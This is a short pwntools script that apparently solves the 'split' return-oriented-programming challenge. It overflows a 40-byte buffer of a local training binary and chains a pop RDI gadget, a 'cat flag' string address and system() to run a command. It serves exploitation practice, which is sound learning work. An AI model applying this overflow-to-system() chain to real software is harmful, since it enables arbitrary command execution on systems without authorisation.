from pwn import *

payld =  "A"*40
payld += p64(0x00400883) # pop RDI
payld += p64(0x601060) # cat flag string
payld += p64(0x004005e0) # system
p = process("./split")
p.recvuntil(">")
p.sendline(payld)
p.interactive()
